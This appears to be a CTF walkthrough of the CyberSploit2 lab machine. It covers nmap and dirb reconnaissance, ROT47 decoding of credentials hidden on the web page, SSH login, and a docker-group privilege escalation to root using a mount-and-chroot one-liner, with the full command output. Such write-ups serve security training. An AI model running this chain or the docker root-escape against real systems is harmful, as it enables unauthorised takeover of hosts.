# Cybersploit2 Pentesting Notes

# Step 1: Nmap Service Scans

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sSVC 192.168.8.80 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 02:26 EDT
Nmap scan report for 192.168.8.80
Host is up (0.00064s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CyberSploit2
|_http-server-header: Apache/2.4.37 (centos)
MAC Address: 08:00:27:71:1B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
```

### Open Ports & Services

- **22/tcp → SSH**
    - Service: `OpenSSH 8.0 (protocol 2.0)`
    - Host keys fingerprinted (RSA, ECDSA, ED25519)
- **80/tcp → HTTP**
    - Service: `Apache httpd 2.4.37 (CentOS)`
    - Title: **CyberSploit2**
    - HTTP Methods: **TRACE** enabled (potentially risky → XST attack vector)
    - Header: `Apache/2.4.37 (CentOS)`

# Step 2: Check for Public Exploits

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit OpenSSH 8.0     
searchsploit Apache httpd 2.4.37

Exploits: No Results
Shellcodes: No Results
Exploits: No Results
Shellcodes: No Results
```

### Searchsploit

- **OpenSSH 8.0** → No known public exploits.
- **Apache httpd 2.4.37** → No direct exploits.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --script vuln 192.168.8.80 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 02:32 EDT
Nmap scan report for 192.168.8.80
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
MAC Address: 08:00:27:71:1B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 32.29 seconds

```

### Nmap Vulnerability Scripts (`-script vuln`)

### Findings

- **22/tcp → SSH**
    - No vulnerabilities detected.
- **80/tcp → HTTP (Apache)**
    - **TRACE enabled** → Potential **Cross-Site Tracing (XST)** vulnerability.
    - **Directory Listing** found at `/icons/`
        - Could expose files, configs, or give hints about server setup.
    - No DOM-based XSS, CSRF, or Stored XSS detected.

# Step 3 : Directory Brute Force (Dirb)

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.8.80/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep  5 02:38:11 2025
URL_BASE: http://192.168.8.80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.8.80/ ----
+ http://192.168.8.80/cgi-bin/ (CODE:403|SIZE:217)                                                            
+ http://192.168.8.80/index.html (CODE:200|SIZE:3471)                                                         
==> DIRECTORY: http://192.168.8.80/noindex/                                                                   
                                                                                                              
---- Entering directory: http://192.168.8.80/noindex/ ----
==> DIRECTORY: http://192.168.8.80/noindex/common/                                                            
+ http://192.168.8.80/noindex/index (CODE:200|SIZE:4006)                                                      
+ http://192.168.8.80/noindex/index.html (CODE:200|SIZE:4006)                                                 
                                                                                                              
---- Entering directory: http://192.168.8.80/noindex/common/ ----
==> DIRECTORY: http://192.168.8.80/noindex/common/css/                                                        
==> DIRECTORY: http://192.168.8.80/noindex/common/fonts/                                                      
==> DIRECTORY: http://192.168.8.80/noindex/common/images/                                                     
                                                                                                              
---- Entering directory: http://192.168.8.80/noindex/common/css/ ----
+ http://192.168.8.80/noindex/common/css/styles (CODE:200|SIZE:71634)                                         
                                                                                                              
---- Entering directory: http://192.168.8.80/noindex/common/fonts/ ----
                                                                                                              
---- Entering directory: http://192.168.8.80/noindex/common/images/ ----
                                                                                                              
-----------------
END_TIME: Fri Sep  5 02:39:59 2025
DOWNLOADED: 27672 - FOUND: 5

```

### Findings

- **/cgi-bin/** → 403 Forbidden (but keep in mind for possible *Shellshock* or script execution).
- **/index.html** → Main page (already analyzed).
- **/noindex/** → Hidden directory discovered.
    - `/noindex/index` (200, size 4006)
    - `/noindex/index.html` (200, size 4006)
    - `/noindex/common/`
        - `/noindex/common/css/styles` (200, size 71634)
        - `/noindex/common/fonts/`
        - `/noindex/common/images/`

# Step 4: Test Web Server Using curl

```bash
┌──(kali㉿kali)-[~]
└─$ curl -i http://192.168.8.80/
HTTP/1.1 200 OK
Date: Fri, 05 Sep 2025 06:36:36 GMT
Server: Apache/2.4.37 (centos)
Last-Modified: Tue, 14 Jul 2020 22:36:40 GMT
ETag: "d8f-5aa6e70e5f2cf"
Accept-Ranges: bytes
Content-Length: 3471
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <title>CyberSploit2</title>
  </head>
  <body>
    <h1>Welcom To CyberSploit2 !</h1>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="#">White Hat</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarNav">
    <ul class="navbar-nav">
      <li class="nav-item active">
        <a class="nav-link" href="#">Black Hat <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Pentester</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Red Teaming</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Noobs</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Coder</a>
      </li>

      </li>
    </ul>
  </div>
</nav>

<table class="table table-dark">
  <thead>
    <tr>
      <th scope="col">#<th>
      <th scope="col">Username</th>
      <th scope="col">Password</th>
      <th scope="col">Handle</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">1</th>
      <td>Mark</td>
      <td>Otto</td>
      <td>@shadi.com</td>
    </tr>
    <tr>
      <th scope="row">2</th>
      <td>Jacob</td>
      <td>Thornton</td>
      <td>@Hypper</td>
    </tr>
    <tr>
      <th scope="row">3</th>
      <td>Larry</td>
      <td>the Bird</td>
      <td>@twitter</td>
    </tr>
 
      <th scope="row">4</th>
      <td>D92:=6?5C2</td>
      <td>4J36CDA=@:E`</td>
      <td>@twitter</td>
    </tr>
 <th scope="row">5</th>
      <td>Sam</td>
      <td>uwshdijwi</td>
      <td>@twitter</td>
    </tr>
 <th scope="row">6</th>
      <td>cevgl</td>
      <td>cevgl@1234</td>
      <td>@Attitude</td>
    </tr>

 <th scope="row">7</th>
      <td>Madhu</td>
      <td>12345678</td>
      <td>@facebook</td>
    </tr>
 <th scope="row">8</th>
      <td>Neha</td>
      <td>I love my Jaan</td>
      <td>@tiktok</td>
    </tr>
 <th scope="row">9</th>
      <td>Mahi</td>
      <td>Love you dear</td>
      <td>@Love</td>
    </tr>

</tr>

  </tbody>
</table>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<!----------ROT47---------->  
</body>
</html>
```

Web Page Enumeration (`curl -i http://192.168.8.80/`)

### Findings

- Web page title: **CyberSploit2**
- Contains a **Bootstrap-styled table** with usernames and passwords.
- Most entries look fake/filler, but some stand out.

### Credentials Table (Extracted)

| # | Username | Password | Handle |
| --- | --- | --- | --- |
| 4 | `D92:=6?5C2` | `4J36CDA=@:E`` | @twitter |
| 6 | `cevgl` | `cevgl@1234` | @Attitude |
| 7 | `Madhu` | `12345678` | @facebook |
| 8 | `Neha` | `I love my Jaan` | @tiktok |
| 9 | `Mahi` | `Love you dear` | @Love |

---

### Analysis

- The HTML comment at bottom:
    
    ```html
    <!----------ROT47---------->
    
    ```
    
    🔑 Suggests **some credentials are ROT47 encoded**.
    
- Entry `#4` looks suspicious → encoded username & password (`ROT47`).

# Step 5 : Decode ROT47 strings

```bash
clear┌──(kali㉿kali)-[~]
└─$ echo "D92:=6?5C2" | tr '\!-~' 'P-~\!-O'
echo "4J36CDA=@:E\`" | tr '\!-~' 'P-~\!-O'

shailendra
cybersploit1

```

### Decoded Credentials

- **Username:** `shailendra`
- **Password:** `cybersploit1`

# Step 6 : SSH Access

```bash
┌──(kali㉿kali)-[~]
└─$ ssh shailendra@192.168.8.80
The authenticity of host '192.168.8.80 (192.168.8.80)' can't be established.
ED25519 key fingerprint is SHA256:Ua5bYFU7jRE2PNF3w1hs2yrzHmyU7Q3FWj0xvMKZDro.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.8.80' (ED25519) to the list of known hosts.
shailendra@192.168.8.80's password: 
Last login: Wed Jul 15 12:32:09 2020
[shailendra@TechPanda-SagarV ~]$ 

```

### Result

- ✅ Login successful as user: **shailendra**
- Hostname: `TechPanda-SagarV`
- Last login: Wed Jul 15 12:32:09 2020

# Step 7 : Local Enumeration

```bash
[shailendra@TechPanda-SagarV ~]$ ls
hint.txt
[shailendra@TechPanda-SagarV ~]$ cat hint.txt
docker
[shailendra@TechPanda-SagarV ~]$
```

## Analysis

- The system is hinting at **Docker-based privilege escalation**.
- Common misconfiguration: user is in the **docker group**, allowing root escalation via container abuse.
- If `shailendra` has docker privileges, he can mount the host filesystem inside a container → **root shell**.

# Step 8 : Docker-based privilege escalation

### Functions / Privileges

| Binary | Functions |
| --- | --- |
| docker | Shell, File write, File read, SUID, Sudo (potential root) |
- `docker` can be abused to gain **root privileges** if the user is in the **docker group**.
- Typical attack vector: **mount host filesystem inside a container and get a root shell**.
- Since `hint.txt` mentions `docker`, it’s a strong indicator this is the **intended PrivEsc path**.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

- The resulting is a root shell.
    
    ```
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```
    

### **Privilege Escalation via Docker**

```bash
[shailendra@TechPanda-SagarV ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
9824c27679d3: Pull complete 
Digest: sha256:4bcff63911fcb4448bd4fdacec207030997caf25e9bea4045fa6c8c44de311d1
Status: Downloaded newer image for alpine:latest
sh-4.4# 
```

### Outcome

- Pulled `alpine:latest` image
- Mounted host `/` into `/mnt` inside container
- `chroot /mnt sh` → got **root shell on host system**

# Step 9 : Root Access Achieved

```bash
sh-4.4# whoami
root
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(cdrom),20(games),26,27 context=system_u:system_r:spc_t:s0

```

### Analysis

- Full root privileges confirmed.
- Privilege escalation achieved via **Docker container mount + chroot**.
- Target fully compromised (for lab/CTF purposes).

# Step 10 : Root Directory Exploration

```bash
sh-4.4# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
sh-4.4# cd /root
sh-4.4# ls
anaconda-ks.cfg  flag.txt  get-docker.sh  logs}
sh-4.4# cat flag.txt
 __    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 
sh-4.4# 

```

### Analysis

- Flag confirms **full system compromise**.
- PrivEsc via **Docker** worked perfectly.

# Lessons Learned

1. **ROT47 Encoding**
    - Used to hide credentials on the web page.
2. **SSH Enumeration**
    - Always check for low-privileged users.
3. **Docker Privilege Escalation**
    - If a user is in the `docker` group, host root is easily accessible.
4. **Hidden Directories & Files**
    - `/noindex/` folder revealed additional content.

### 30. Complete Cybersploit2 Workflow

| Step | Action | Result |
| --- | --- | --- |
| 1 | Nmap scan | SSH 22 + HTTP 80 |
| 2 | Searchsploit | No exploits |
| 3 | Nmap vuln scripts | TRACE enabled, /icons dir |
| 4 | Curl homepage | ROT47 encoded creds found |
| 5 | ROT47 decode | shailendra / cybersploit1 |
| 6 | SSH login | Low-privileged shell |
| 7 | Enumerate home | hint.txt → docker |
| 8 | Check docker binary | Present & usable |
| 9 | Docker PrivEsc | Root shell ✅ |
| 10 | Explore /root | flag.txt captured ✅ |

---
